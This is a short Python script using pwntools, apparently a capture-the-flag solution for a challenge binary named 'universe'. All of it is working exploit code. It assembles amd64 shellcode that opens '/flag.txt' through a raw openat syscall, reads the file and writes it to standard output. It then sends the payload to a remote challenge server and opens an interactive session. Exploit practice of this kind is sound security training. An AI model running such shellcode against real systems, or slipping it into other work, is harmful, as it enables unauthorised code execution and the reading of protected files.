from pwn import *

context.binary = ELF("player/universe")

shellcode = pwnlib.shellcraft.amd64.pushstr('/flag.txt')
shellcode += '''
    xor rdi, rdi /* 0 */
    mov rsi, rsp
    xor rdx, rdx /* 0 */
    xor r10, r10 /* 0 */
    /* call openat() */
    push 257
    pop rax
    syscall
'''
shellcode += pwnlib.shellcraft.amd64.mov("r8", "rax")
shellcode += pwnlib.shellcraft.amd64.linux.read("r8", "rsp", 1000)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', "rax")


#p = process('player/universe')
p = remote('challenge.bugpwn.com', 1004)
p.send(asm(shellcode).ljust(0x1000, b'\0'))
p.interactive()
